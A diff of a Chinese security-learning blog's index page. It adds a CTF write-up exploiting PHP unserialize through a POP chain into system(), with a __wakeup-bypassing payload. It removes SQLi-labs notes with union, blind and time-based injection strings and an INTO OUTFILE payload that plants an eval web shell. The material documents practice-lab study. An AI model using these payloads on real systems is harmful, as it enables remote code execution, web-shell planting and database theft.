@@ -73,6 +73,102 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-n-ez-unserilize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/03/n-ez-unserilize/" class="article-date">
+  <time class="dt-published" datetime="2024-03-03T05:17:45.000Z" itemprop="datePublished">2024-03-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/03/n-ez-unserilize/">n_ez_unserilize</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">class Cache &#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $value;</span><br><span class="line">    public $expired;</span><br><span class="line">    public $helper;</span><br><span class="line"></span><br><span class="line">    public function __construct($key, $value, $helper) &#123;</span><br><span class="line">        $this-&gt;key = $key;</span><br><span class="line">        $this-&gt;value = $value;</span><br><span class="line">        $this-&gt;helper = $helper;</span><br><span class="line"></span><br><span class="line">        $this-&gt;expired = False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;expired = False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function expired() &#123;</span><br><span class="line">        if ($this-&gt;expired) &#123;</span><br><span class="line">            $this-&gt;helper-&gt;clean($this-&gt;key);</span><br><span class="line">            return True;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return False;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Storage &#123;</span><br><span class="line">    public $store;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;store = array();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __set($name, $value) &#123;</span><br><span class="line">        if (!$this-&gt;store) &#123;</span><br><span class="line">            $this-&gt;store = array();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!$value-&gt;expired()) &#123;</span><br><span class="line">            $this-&gt;store[$name] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        return $this-&gt;data[$name];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Helper &#123;</span><br><span class="line">    public $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($funcs) &#123;</span><br><span class="line">        $this-&gt;funcs = $funcs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $args) &#123;</span><br><span class="line">        $this-&gt;funcs[$name](...$args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DataObject &#123;</span><br><span class="line">    public $storage;</span><br><span class="line">    public $data;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        foreach ($this-&gt;data as $key =&gt; $value) &#123;</span><br><span class="line">            $this-&gt;storage-&gt;$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;u&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;u&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先统计一下里面用到的魔术方法</p>
+<ol>
+<li><p>__construct()</p>
+</li>
+<li><p>__destruct()</p>
+</li>
+<li><p>__wakeup()</p>
+</li>
+<li><p>__get()</p>
+</li>
+<li><p>__set()</p>
+</li>
+<li><p>__call()</p>
+<p>再看一眼属性，都是public</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;u&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;u&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要么从wakeup开始，要么从construct开始，看下内容，是后者，把 <code>DataObject</code> 记录为1号</p>
+<p>从 <code>Cache</code> 开始看起，发现 <code>$this-&gt;helper-&gt;clean($this-&gt;key);</code> </p>
+<p>可以触发__call()</p>
+<p>看一下__call()内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;funcs[$name](...$args);</span><br></pre></td></tr></table></figure>
+
+<p>搜了一下，这句是可变函数调用语法，第一次遇到可变函数调用，还不太会用，不过既然是调用就排在最后一步<br>那么<code>Cache</code>定为倒数第二步</p>
+<p>回来看<code>DataObject</code>，里面存在一个赋值$key的操作， <code>$this-&gt;storage-&gt;$key</code> 成员命名是个线索，正好能跟 <code>Storage</code> 联系起来，（代码里Cache里面也存在$key,不过__construct会赋值），触发set方法</p>
+<p>代码里存在一个wakeup方法，其方法会使后面的i判断不成立，也就无法调用clean方法，这一点需要wakeup绕过</p>
+<hr>
+<p>逻辑顺序清楚了，从最后一步看起  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当调用一个对象中不存在的方法时，会自动触发`__call()`方法。在这里，`__call()`方法接受两个参数：name表示调用的方法名，name表示调用的方法名，args表示传递给该方法的参数数组。</span><br></pre></td></tr></table></figure>
+
+<p>也就是说目标语句在数组里面键值为clean</p>
+<p>$helper&#x3D;new Helper();</p>
+<p>$helper-&gt;funcs&#x3D;array(‘clean’&#x3D;&gt;’system’);</p>
+<hr>
+<p>之后是cache部分</p>
+<p>$cache&#x3D;new Cache();</p>
+<p>$cache-&gt;helper&#x3D;$helper;</p>
+<p>$cache-&gt;expired&#x3D;True;</p>
+<p>$cache-&gt;key&#x3D;’php -r “phpinfo();”‘;</p>
+<p>第三行是为了通过if判断从而触发clean方法</p>
+<hr>
+<p>再之后是</p>
+<p>$storage&#x3D;new Storage();</p>
+<p>$dataObject&#x3D;new DataObject();</p>
+<p>$dataObject-&gt;data&#x3D;array(‘key’&#x3D;&gt;$cache);</p>
+<p>$dataObject-&gt;storage&#x3D;$storage;</p>
+<hr>
+<p>最最后别忘了wakeup的绕过，方法是使序列化之后表示成员数量的值大于实际的成员数量</p>
+<p>具体比较可以看一下后面pop链跑出来的和payload的区别</p>
+<p><img src="/images/3.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=O:10:&quot;DataObject&quot;:2:&#123;s:7:&quot;storage&quot;;O:7:&quot;Storage&quot;:1:&#123;s:5:&quot;store&quot;;N;&#125;s:4:&quot;data&quot;;a:1:&#123;s:3:&quot;key&quot;;O:5:&quot;Cache&quot;:66:&#123;s:3:&quot;key&quot;;s:19:&quot;php -r &quot;phpinfo();&quot;&quot;;s:5:&quot;value&quot;;N;s:7:&quot;expired&quot;;b:1;s:6:&quot;helper&quot;;O:6:&quot;Helper&quot;:1:&#123;s:5:&quot;funcs&quot;;a:1:&#123;s:5:&quot;clean&quot;;s:6:&quot;system&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/3.png"></p>
+<p>最后再放一下通关flag</p>
+<p><img src="/images/2.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/03/n-ez-unserilize/" data-id="clu7pl2pv0004q8b5edgj1c84" data-title="n_ez_unserilize" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
@@ -117,7 +213,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="clu7pilz3000qr0b52jdz9gbt" data-title="文件上传" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="clu7pl2q2000rq8b5a6a6d8ds" data-title="文件上传" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -332,7 +428,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/23/serialize/" data-id="clu7pilyw000br0b5ekbg2blm" data-title="serialize" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/23/serialize/" data-id="clu7pl2px0008q8b5b2lm3n8n" data-title="serialize" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -434,7 +530,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/15/upload/" data-id="clu7pilyx000gr0b55cuo5ojs" data-title="upload" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/15/upload/" data-id="clu7pl2py000fq8b55yuf5rlv" data-title="upload" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -486,7 +582,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/13/xss-11-13/" data-id="clu7pilyz000lr0b5ayfj9zm0" data-title="xss_11~13" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/13/xss-11-13/" data-id="clu7pl2pz000jq8b58qfmbznx" data-title="xss_11~13" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -554,7 +650,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/13/xss-7-10/" data-id="clu7pilyx000hr0b51qpchvk4" data-title="xss_7~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/13/xss-7-10/" data-id="clu7pl2pz000hq8b50kxi619c" data-title="xss_7~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -607,7 +703,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/13/xss4-6/" data-id="clu7pilyx000jr0b5cfyxaizr" data-title="xss4~6" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/13/xss4-6/" data-id="clu7pl2pz000kq8b578vj8f5r" data-title="xss4~6" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -664,7 +760,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/12/xss1-3/" data-id="clu7pilyx000ir0b59i6r4ugc" data-title="xss1~3" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/12/xss1-3/" data-id="clu7pl2q0000lq8b5fmeh1ec3" data-title="xss1~3" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -734,7 +830,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/11/sql16-20/" data-id="clu7pilyw000er0b5hgc41aue" data-title="sql16~20" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/11/sql16-20/" data-id="clu7pl2py000cq8b53u6j7hhf" data-title="sql16~20" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -794,196 +890,7 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/09/sql11-15/" data-id="clu7pilyv000ar0b56cq0f14w" data-title="sql11~15" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sql1-10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/02/07/sql1-10/" class="article-date">
-  <time class="dt-published" datetime="2024-02-07T13:56:54.000Z" itemprop="datePublished">2024-02-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/02/07/sql1-10/">sql1~10</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>基础知识</strong></p>
-<p>select system_user()&#x2F;user()显示系统用户</p>
-<p>select database()显示数据库</p>
-<p>select version()musql版本</p>
-<p>select @@database安装路径</p>
-<p>select @@version_compile_os 操纵系统</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>第一关</strong></p>
-<p>?id&#x3D;1‘报错，说明我们所填入的内容被存在’   ’之间，会变成‘1’‘，mysql会报错</p>
-<ul>
-<li></li>
-</ul>
-<p>order by 1，2，3…查询有多少列</p>
-<ul>
-<li></li>
-</ul>
-<p>union select 1,2,schema_name from information_schema schemata–+</p>
-<p>取出数据库名(3处为回显点)</p>
-<ul>
-<li></li>
-</ul>
-<p>group_concat（）函数</p>
-<p>concat_ws(‘~’,A,B)函数</p>
-<p>&#x2F;?id&#x3D;-1’ union select 1,2,concat_ws(‘~’,username,password) from security.users–+</p>
-<p>取出username<del>password形式，最好将‘</del>’转换成0x+~的十六进制</p>
-<ul>
-<li></li>
-</ul>
-<p>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+取出security库里面所有表</p>
-<p>其中table_schema&#x3D;’security’不推荐，会引入单引号问题，建议改成十六进制，0x＋security十六进制表示</p>
-<ul>
-<li></li>
-</ul>
-<p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+取出users表里的列数据</p>
-<ul>
-<li></li>
-</ul>
-<p>?id&#x3D;-1’ union select 1,2,group_concat(password) from security.users–+取出security库users表password列对应的数据</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>第二关</strong></p>
-<p>SELECT * FROM users WHERE id&#x3D;1’ LIMIT 0,1 这个报错说明原代码id&#x3D;后面没有’‘，因此没有必要加’</p>
-<p>其余部分跟第一关没有区别</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>第三关</strong></p>
-<p>SELECT * FROM users WHERE id&#x3D;(‘1’) LIMIT 0,1 ，用（）包裹起来</p>
-<p>用1‘）–+注入，其他与前两关一样</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>第四关</strong></p>
-<p>SELECT * FROM users WHERE id&#x3D;(“1”) LIMIT 0,1 </p>
-<p>用1“）–+注入，其他与前两关一样</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>基础知识</strong></p>
-<p>select left(database(),1)&#x3D;’s’   判断database（）前一位是否为s，是返回1，否返回0</p>
-<ul>
-<li></li>
-</ul>
-<p>regexp  匹配目标，如果成功返回1，失败返回0</p>
-<p>——select user（） regexp ’r‘，user（）结果为root，成立，返回1</p>
-<p>——select user（） regexp ’root‘，user（）结果为root，成立，返回1</p>
-<p>——select user（） regexp ’rot‘，user（）结果为root，不成立，返回0</p>
-<ul>
-<li></li>
-</ul>
-<p>like函数 和regexp类似，不过语句略有区别</p>
-<p>——select user（） like ’r%‘和——select user（） regexp ’r‘一个效果</p>
-<ul>
-<li></li>
-</ul>
-<p>substr(a,b,c)从b位置开始，截取a字符串c位长度</p>
-<p>——select database((select database()),1,1)&#x3D;’s’判断database（）第一位是否为s</p>
-<ul>
-<li></li>
-</ul>
-<p>ascii（）把里面的字符串转换成askii码</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>第五关</strong></p>
-<p>布尔盲注——正确的时候输出一些语句，之前的方法没有回显点了，不能联合查询</p>
-<p>?id&#x3D;1’ order by 3–+最多到3，表明只有三列</p>
-<p>?id&#x3D;1’ and left((select database()),1)&#x3D;’s’–+返回正常，说明 left((select database()),1)&#x3D;’s’的值为1，第一位为s</p>
-<ul>
-<li></li>
-</ul>
-<p>用burp suite暴力破解，根据返回长度，看出正确字母</p>
-<ul>
-<li></li>
-</ul>
-<p>另一种方法：and ascii(substr((select schema_naame from information_schema.schemata limit,1,1),1,1))&gt;156 (通过二分法判断)</p>
-<p>通过上面方法获得数据库名</p>
-<p>其他部分依旧用同样方法来获得</p>
-<p><strong>第六关</strong></p>
-<p>第六关和第五关基本相同，不过把语句中的id&#x3D;‘xxx’变成了id&#x3D;“xxx”</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>补充知识</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>查看 查看**<code>secure_file_priv</code>**的值 </p>
-<p>secure_file_priv &#96;为NULL禁止导出文件，默认值</p>
-<p>secure_file_priv&#96;指定地址限制导出地址只能在此 secure_file_priv&#x3D;”D:&#x2F;“</p>
-<p>secure_file_priv为空可以导出到任意文件 &#96;secure_file_priv&#x3D;</p>
-<ul>
-<li></li>
-</ul>
-<p>一句话木马</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p>
-<ul>
-<li></li>
-</ul>
-<p>load file() 读取本地文件</p>
-<ul>
-<li></li>
-</ul>
-<p>‘内容’ into outfile ‘路径’ ‘名称’ 写入文件</p>
-<ul>
-<li></li>
-</ul>
-<p>if（condition，A，B）</p>
-<p>condition为true，A，condition判定为false，B</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>第七关</strong></p>
-<p>？id&#x3D;-1’)) union select 1,2,’<code>&lt;?php @eval($_POST[&quot;crow&quot;];?&gt;</code>‘ into outfile ‘C:\xxx\Less-7\a.php’)–+</p>
-<p>写入一句话木马，用中国蚁剑破解（crow为密码），获得网站的webshell</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>第八关</strong></p>
-<p>可以像第五关一样布尔盲注确定数据库名称等</p>
-<p>时间盲注?id&#x3D;1’ and if（askii(substr((select database()),1,1))&gt;10,1,sleep(5))–+然后再控制器里面看哪个值返回慢。这一句用来判断数据库长度，此方法也可以判断数据库名称内容等</p>
-<ul>
-<li></li>
-</ul>
-<p><strong>第九关</strong></p>
-<p>布尔盲注不可用，无论布尔值为0，或者1，不会产生输出区别</p>
-<p>但是可以使用第八关时间盲注</p>
-<p><strong>第十关</strong></p>
-<p>和第九关大致上一样，把id&#x3D;’1‘换成了id&#x3D;“1”</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/07/sql1-10/" data-id="clu7pilyw000cr0b5agjtey7c" data-title="sql1~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/09/sql11-15/" data-id="clu7pl2py000eq8b5eugqcrqo" data-title="sql11~15" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1053,15 +960,15 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
           </li>
         
           <li>
+            <a href="/2024/03/20/vue/">vue</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/17/java%E7%A8%8D%E8%BF%9B%E9%98%B6/">java稍进阶</a>
           </li>
         
           <li>
             <a href="/2024/03/15/Java%E5%9F%BA%E7%A1%80/">Java基础</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/12/XXE/">XXE</a>
           </li>
         
       </ul>
